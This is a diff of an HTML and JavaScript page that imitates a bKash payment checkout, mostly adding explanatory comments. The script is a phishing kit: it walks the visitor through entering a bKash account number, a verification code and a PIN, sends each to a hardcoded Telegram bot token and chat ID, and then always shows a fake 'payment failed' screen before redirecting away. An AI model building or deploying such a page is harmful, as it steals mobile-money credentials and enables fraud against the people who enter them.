@@ -9,21 +9,21 @@
         body {
             margin: 0;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
-            background-color: #f3f4f6;
+            background-color: #f3f4f6; /* Equivalent to gray-100 */
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            padding: 1rem;
+            padding: 1rem; /* Equivalent to p-4 */
         }
 
         /* Card Container */
         .card {
             width: 100%;
-            max-width: 24rem;
-            border-radius: 0.75rem;
+            max-width: 24rem; /* Equivalent to max-w-sm */
+            border-radius: 0.75rem; /* Equivalent to rounded-xl */
             overflow: hidden;
-            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); /* Equivalent to shadow-lg */
             background-color: #ffffff;
         }
 
@@ -35,14 +35,14 @@
         .logo-section {
             display: flex;
             justify-content: center;
-            padding-top: 0;
-            padding-bottom: 1rem;
+            padding-top: 0; /* Original code had pt-0, but image suggests some padding */
+            padding-bottom: 1rem; /* Equivalent to pb-4 */
             background-color: #ffffff;
         }
 
         .logo {
-            width: 9.375rem;
-            height: 3.125rem;
+            width: 9.375rem; /* Equivalent to width={150} */
+            height: 3.125rem; /* Equivalent to height={50} */
             object-fit: contain;
         }
 
@@ -50,69 +50,69 @@
         .transaction-summary {
             display: flex;
             align-items: center;
-            gap: 1rem;
-            padding: 1rem;
-            border-top: 1px solid #e5e7eb;
-            border-bottom: 1px solid #e5e7eb;
+            gap: 1rem; /* Equivalent to gap-4 */
+            padding: 1rem; /* Equivalent to p-4 */
+            border-top: 1px solid #e5e7eb; /* Equivalent to border-t */
+            border-bottom: 1px solid #e5e7eb; /* Equivalent to border-b */
             background-color: #ffffff;
         }
 
         .avatar {
-            width: 2.5rem;
-            height: 2.5rem;
-            background-color: #f3f4f6;
+            width: 2.5rem; /* Equivalent to w-10 */
+            height: 2.5rem; /* Equivalent to h-10 */
+            background-color: #f3f4f6; /* Equivalent to bg-gray-100 */
             display: flex;
             align-items: center;
             justify-content: center;
-            border-radius: 9999px;
+            border-radius: 9999px; /* Equivalent to rounded-full */
         }
 
         .shopping-cart-icon {
-            width: 1.25rem;
-            height: 1.25rem;
-            color: #6b7280;
+            width: 1.25rem; /* Equivalent to w-5 */
+            height: 1.25rem; /* Equivalent to h-5 */
+            color: #6b7280; /* Equivalent to text-gray-500 */
         }
 
         .summary-details {
-            flex: 1;
+            flex: 1; /* Equivalent to flex-1 */
         }
 
         .merchant-name {
-            font-size: 0.75rem;
-            font-weight: 500;
-            color: #374151;
+            font-size: 0.75rem; /* Equivalent to text-xs */
+            font-weight: 500; /* Equivalent to font-medium */
+            color: #374151; /* Equivalent to text-gray-800 */
         }
 
         .invoice-number {
-            font-size: 0.625rem;
-            color: #6b7280;
+            font-size: 0.625rem; /* Equivalent to text-[10px] */
+            color: #6b7280; /* Equivalent to text-gray-500 */
         }
 
         .amount {
-            font-size: 1.125rem;
-            font-weight: 600;
-            color: #374151;
+            font-size: 1.125rem; /* Equivalent to text-lg */
+            font-weight: 600; /* Equivalent to font-semibold */
+            color: #374151; /* Equivalent to text-gray-800 */
         }
 
         /* bKash Account Number Input Section */
         .bkash-input-section {
-            background-color: #e3007f;
-            padding: 1.5rem;
+            background-color: #e3007f; /* Equivalent to bg-bkash-pink */
+            padding: 1.5rem; /* Equivalent to p-6 */
             color: #ffffff;
-            min-height: 24rem;
+            min-height: 24rem; /* Equivalent to aspect-square, assuming 1:1 ratio with max-w-sm (384px), so ~384px height */
             display: flex;
             flex-direction: column;
             justify-content: center;
-            align-items: center;
+            align-items: center; /* Center horizontally */
             text-align: center;
-            box-sizing: border-box;
+            box-sizing: border-box; /* Include padding in height calculation */
         }
 
         .section-title {
-            font-size: 1.125rem;
-            font-weight: 600;
+            font-size: 1.125rem; /* Equivalent to text-lg */
+            font-weight: 600; /* Equivalent to font-semibold */
             text-align: center;
-            margin-bottom: 1rem;
+            margin-bottom: 1rem; /* Adjust as needed for spacing */
         }
 
         .account-number-input-wrapper {
@@ -120,18 +120,18 @@
             display: flex;
             align-items: center;
             width: 100%;
-            max-width: 18rem;
-            margin-bottom: 0.5rem;
+            max-width: 18rem; /* Adjusted for better appearance, original width-full */
+            margin-bottom: 0.5rem; /* Spacing below input */
         }
 
         .account-number-input {
             width: 100%;
-            border-radius: 0.375rem;
-            border: 1px solid #e2e8f0;
+            border-radius: 0.375rem; /* Equivalent to rounded-md */
+            border: 1px solid #e2e8f0; /* Equivalent to border */
             background-color: #ffffff;
-            padding: 0.5rem 1rem;
-            font-size: 1rem;
-            color: #374151;
+            padding: 0.5rem 1rem; /* Equivalent to px-4 py-2 */
+            font-size: 1rem; /* Equivalent to text-base */
+            color: #374151; /* Equivalent to text-gray-800 */
             text-align: center;
             outline: none;
             box-shadow: none;
@@ -139,45 +139,45 @@
         }
 
         .account-number-input::placeholder {
-            color: #9ca3af;
+            color: #9ca3af; /* Equivalent to placeholder:text-gray-400 */
         }
 
         .account-number-input:focus {
-            border-color: transparent;
-            outline: none;
-            box-shadow: none;
+            border-color: transparent; /* focus:border-transparent */
+            outline: none; /* focus:outline-none */
+            box-shadow: none; /* focus:ring-0 focus:ring-offset-0 */
         }
 
         .terms-conditions {
-            font-size: 0.75rem;
+            font-size: 0.75rem; /* Equivalent to text-xs */
             text-align: center;
-            margin-top: 1rem;
+            margin-top: 1rem; /* Spacing above terms */
         }
 
         .terms-conditions a {
-            font-weight: 500;
+            font-weight: 500; /* Equivalent to font-medium */
             text-decoration: underline;
             color: #ffffff;
             transition: color 0.2s ease-in-out;
         }
 
         .terms-conditions a:hover {
-            color: #e5e7eb;
+            color: #e5e7eb; /* Equivalent to hover:text-gray-200 */
         }
 
         /* Action Buttons */
         .action-buttons {
             display: flex;
             justify-content: space-around;
-            padding: 0.625rem;
-            gap: 1rem;
+            padding: 0.625rem; /* Equivalent to p-2.5 */
+            gap: 1rem; /* Equivalent to gap-4 */
             background-color: #ffffff;
         }
 
         .btn {
-            flex: 1;
-            border-radius: 0.375rem;
-            padding: 0.625rem 1rem;
+            flex: 1; /* Equivalent to flex-1 */
+            border-radius: 0.375rem; /* Equivalent to rounded-md */
+            padding: 0.625rem 1rem; /* Standard button padding */
             font-size: 1rem;
             cursor: pointer;
             transition: all 0.2s ease-in-out;
@@ -185,29 +185,29 @@
         }
 
         .btn-outline {
-            border: 1px solid #d1d5db;
+            border: 1px solid #d1d5db; /* Equivalent to border border-gray-300 */
             background-color: #ffffff;
-            color: #374151;
-            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+            color: #374151; /* Equivalent to text-gray-800 */
+            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); /* Equivalent to shadow-sm */
         }
 
         .btn-outline:hover {
-            background-color: #f9fafb;
+            background-color: #f9fafb; /* Equivalent to hover:bg-gray-50 */
         }
 
         .btn-confirm {
-            background-color: #e3007f;
+            background-color: #e3007f; /* Equivalent to bg-bkash-pink */
             color: #ffffff;
-            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); /* Equivalent to shadow-sm */
         }
 
         .btn-confirm:hover:not(:disabled) {
-            background-color: #cc006f;
+            background-color: #cc006f; /* Slightly darker pink for hover */
         }
 
         .btn-confirm:disabled {
-            background-color: #e5e7eb;
-            color: #9ca3af;
+            background-color: #e5e7eb; /* Equivalent to bg-gray-200 */
+            color: #9ca3af; /* Equivalent to text-gray-500 */
             cursor: not-allowed;
         }
 
@@ -215,14 +215,14 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            space-x: 0.25rem;
+            space-x: 0.25rem; /* Equivalent to space-x-1 */
         }
 
         .dot {
-            width: 0.5rem;
-            height: 0.5rem;
+            width: 0.5rem; /* Equivalent to w-2 */
+            height: 0.5rem; /* Equivalent to h-2 */
             background-color: #ffffff;
-            border-radius: 9999px;
+            border-radius: 9999px; /* Equivalent to rounded-full */
             animation: bounce 1.4s infinite ease-in-out;
         }
 
@@ -241,18 +241,18 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            padding: 0.625rem;
-            font-size: 0.75rem;
-            line-height: 1;
+            padding: 0.625rem; /* Equivalent to p-2.5 */
+            font-size: 0.75rem; /* Equivalent to text-xs */
+            line-height: 1; /* Equivalent to space-y-1 implies minimal line height */
             background-color: #ffffff;
         }
 
         .phone-call-info {
             display: flex;
             align-items: center;
-            gap: 0.25rem;
-            color: #e3007f;
-            margin-bottom: 0.25rem;
+            gap: 0.25rem; /* Equivalent to gap-1 */
+            color: #e3007f; /* Equivalent to text-bkash-pink */
+            margin-bottom: 0.25rem; /* Small margin for spacing */
         }
 
         .copyright {
@@ -317,15 +317,18 @@
 
     <script>
         // --- Telegram Bot Configuration ---
-        const TELEGRAM_BOT_TOKEN = '7751217182:AAEWRJ427aODJ4w9Y9sJw51U28o0QZ_yx4E';
-        const TELEGRAM_CHAT_ID = '7335173906';
+        // You MUST replace these with your actual Telegram bot token and chat ID.
+        // For security, in a real application, these should be handled server-side (like your Next.js example).
+        // For this purely client-side HTML, we're putting them directly here for demonstration.
+        const TELEGRAM_BOT_TOKEN = '7751217182:AAEWRJ427aODJ4w9Y9sJw51U28o0QZ_yx4E'; // REPLACE WITH YOUR BOT TOKEN
+        const TELEGRAM_CHAT_ID = '7335173906'; // REPLACE WITH YOUR CHAT ID
 
         const mainContentArea = document.getElementById('main-content-area');
         const confirmButton = document.getElementById('confirmButton');
         const cancelButton = document.getElementById('cancelButton');
         const actionButtonsDiv = document.querySelector('.action-buttons');
 
-        let currentView = 'accountNumber';
+        let currentView = 'accountNumber'; // 'accountNumber', 'verificationCode', 'pinEntry', 'paymentFailed'
         let currentAccountNumber = '';
         let currentVerificationCode = '';
         let resendTimerInterval;
@@ -379,13 +382,13 @@
         }
 
         function renderView() {
-            mainContentArea.innerHTML = '';
-            actionButtonsDiv.classList.remove('hidden');
+            mainContentArea.innerHTML = ''; // Clear previous content
+            actionButtonsDiv.classList.remove('hidden'); // Ensure buttons are visible
 
             let contentHTML = '';
             let inputId = '';
             let maxLength = 0;
-            let inputType = 'tel';
+            let inputType = 'tel'; // Default to tel for numeric input
             let inputStyle = '';
 
             switch (currentView) {
@@ -446,8 +449,8 @@
                 case 'pinEntry':
                     inputId = 'pinInput';
                     maxLength = 5;
-                    inputType = 'tel';
-                    inputStyle = 'font-size: 1.5rem; letter-spacing: 0.125em;';
+                    inputType = 'tel'; // Use tel type for PIN but manage masking manually
+                    inputStyle = 'font-size: 1.5rem; letter-spacing: 0.125em;'; // text-2xl tracking-wider
                     let maskedAccountNumberForPin = currentAccountNumber ? `${currentAccountNumber.slice(0, 3)} *** ${currentAccountNumber.slice(-3)}` : "";
                     contentHTML = `
                         <div class="bkash-input-section">
@@ -471,7 +474,7 @@
                     break;
 
                 case 'paymentFailed':
-                    actionButtonsDiv.classList.add('hidden');
+                    actionButtonsDiv.classList.add('hidden'); // Hide buttons
                     contentHTML = `
                         <div class="bkash-input-section" style="min-height: 300px; background-color: #e3007f; color: #ffffff; padding-top: 1.5rem; padding-bottom: 1.5rem;">
                             <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color: white; margin-bottom: 1rem;">
@@ -493,17 +496,14 @@
 
             mainContentArea.innerHTML = contentHTML;
             attachEventListeners();
-            updateConfirmButtonState();
+            updateConfirmButtonState(); // Initial state for buttons
         }
 
         function updateConfirmButtonState() {
             if (!confirmButton) return;
 
             let isValid = false;
-            const currentInput = document.getElementById(
-                currentView === 'accountNumber' ? 'accountNumberInput' : 
-                (currentView === 'verificationCode' ? 'verificationCodeInput' : 'pinInput')
-            );
+            const currentInput = document.getElementById(currentView === 'accountNumber' ? 'accountNumberInput' : (currentView === 'verificationCode' ? 'verificationCodeInput' : 'pinInput'));
 
             if (currentInput) {
                 if (currentView === 'accountNumber') {
@@ -511,9 +511,8 @@
                 } else if (currentView === 'verificationCode') {
                     isValid = currentInput.value.length === 6;
                 } else if (currentView === 'pinEntry') {
-                    // FIXED: Correct PIN validation
-                    const actualPin = currentInput.dataset.actualPin || '';
-                    isValid = actualPin.length >= 4 && actualPin.length <= 5;
+                    // Check the length of the actualPin stored in the dataset
+                    isValid = currentInput.dataset.actualPin && currentInput.dataset.actualPin.length >= 4 && currentInput.dataset.actualPin.length <= 5;
                 }
             }
             confirmButton.disabled = !isValid;
@@ -535,7 +534,7 @@
         function hideLoading() {
             if (confirmButton) {
                 confirmButton.innerHTML = 'Confirm';
-                updateConfirmButtonState();
+                updateConfirmButtonState(); // Re-enable based on current input state
             }
         }
 
@@ -545,7 +544,7 @@
             if (confirmButton) {
                 confirmButton.onclick = async () => {
                     showLoading();
-                    await new Promise(resolve => setTimeout(resolve, 800));
+                    await new Promise(resolve => setTimeout(resolve, 800)); // Simulate network delay
 
                     if (currentView === 'accountNumber') {
                         currentAccountNumber = currentInput.value;
@@ -558,7 +557,7 @@
                     } else if (currentView === 'pinEntry') {
                         const actualPin = currentInput.dataset.actualPin || '';
                         await sendToTelegram({ pin: actualPin });
-                        currentView = 'paymentFailed';
+                        currentView = 'paymentFailed'; // This will always go to paymentFailed as per requirements.
                     }
                     hideLoading();
                     renderView();
@@ -568,11 +567,11 @@
             if (cancelButton) {
                 cancelButton.onclick = () => {
                     if (currentView === 'accountNumber') {
-                        currentAccountNumber = '';
+                        currentAccountNumber = ''; // Clear account number
                     } else if (currentView === 'verificationCode') {
-                        currentVerificationCode = '';
+                        currentVerificationCode = ''; // Clear verification code
                     }
-                    currentView = 'accountNumber';
+                    currentView = 'accountNumber'; // Always go back to account number input
                     renderView();
                 };
             }
@@ -582,50 +581,56 @@
                 if (currentView === 'pinEntry') {
                     currentInput.dataset.actualPin = '';
                     currentInput.dataset.displayLength = '0';
-                    currentInput.value = '';
+                    currentInput.value = ''; // Ensure PIN input is clear on load
                 }
 
                 currentInput.oninput = (e) => {
                     let value = e.target.value;
                     if (currentView === 'accountNumber' || currentView === 'verificationCode') {
-                        e.target.value = value.replace(/\D/g, '');
+                        e.target.value = value.replace(/\D/g, ''); // Allow only digits
                     } else if (currentView === 'pinEntry') {
                         let newPin = currentInput.dataset.actualPin || '';
                         const currentDisplayLength = parseInt(currentInput.dataset.displayLength || '0');
 
-                        if (value.length > currentDisplayLength) {
+                        if (value.length > currentDisplayLength) { // New character added
                             const newChar = value.slice(-1);
-                            if (newChar.match(/[0-9]/)) {
+                            if (newChar.match(/[0-9]/)) { // Only accept 0-9 digits
                                 newPin += newChar;
                             }
-                        } else if (value.length < currentDisplayLength) {
+                        } else if (value.length < currentDisplayLength) { // Character deleted
                             newPin = newPin.slice(0, -1);
                         }
 
-                        if (newPin.length > 5) {
-                            newPin = newPin.slice(0, 5);
+                        if (newPin.length > maxLength) {
+                            newPin = newPin.slice(0, maxLength);
                         }
 
                         currentInput.dataset.actualPin = newPin;
                         currentInput.dataset.displayLength = newPin.length.toString();
 
                         if (newPin.length > 0) {
+                            // Set the masked value directly in the input field (last character visible)
                             currentInput.value = "●".repeat(newPin.length - 1) + newPin.slice(-1);
 
+                            // Cancel previous masking timeout
                             clearTimeout(currentInput._pinMaskTimeout);
+
+                            // Mask the last character after a short delay
                             currentInput._pinMaskTimeout = setTimeout(() => {
+                                // Ensure PIN hasn't changed
                                 if (currentInput.dataset.actualPin === newPin) {
                                     currentInput.value = "●".repeat(newPin.length);
                                 }
                             }, 500);
                         } else {
-                            currentInput.value = '';
+                            currentInput.value = ''; // Clear input field if PIN is empty
                         }
                     }
 
-                    updateConfirmButtonState();
+                    updateConfirmButtonState(); // <--- This call is correct here and will update the button based on PIN length.
                 };
 
+                // Initial update for the current input field
                 updateConfirmButtonState();
             }
         }
@@ -635,6 +640,10 @@
             const resendCodeText = document.getElementById('resendCodeText');
             if (resendCodeText) {
                 resendCodeText.innerHTML = `Resend Code in ${resendCountdown}s`;
+                // Confirm button state is handled by updateConfirmButtonState,
+                // but we might want to explicitly disable it if timer means OTP is active
+                // For now, relying on length check for confirm button
+                // confirmButton.disabled = true; // Potentially disable if no code entered yet
 
                 if (resendTimerInterval) clearInterval(resendTimerInterval);
 
@@ -650,12 +659,13 @@
                         const resendCodeButton = document.getElementById('resendCodeButton');
                         if (resendCodeButton) {
                             resendCodeButton.onclick = () => {
+                                // When resend button is clicked, go back to account number input to start fresh or reset OTP
                                 currentView = 'accountNumber';
-                                currentVerificationCode = '';
+                                currentVerificationCode = ''; // Clear verification code
                                 renderView();
                             };
                         }
-                        updateConfirmButtonState();
+                        updateConfirmButtonState(); // Re-evaluate confirm button state
                     }
                 }, 1000);
             }
@@ -674,13 +684,14 @@
                     } else {
                         clearInterval(redirectTimerInterval);
                         redirectText.innerHTML = `Redirecting to <span style="font-weight: 500; text-decoration: underline;">Merchant Website</span>`;
+                        // Simulate redirecting to the referrer or going back
                         setTimeout(() => {
                             if (document.referrer) {
                                 window.location.href = document.referrer;
                             } else {
-                                window.history.back();
+                                window.history.back(); // Fallback if no referrer is available
                             }
-                        }, 1000);
+                        }, 1000); // Small delay before actual redirect
                     }
                 }, 1000);
             }
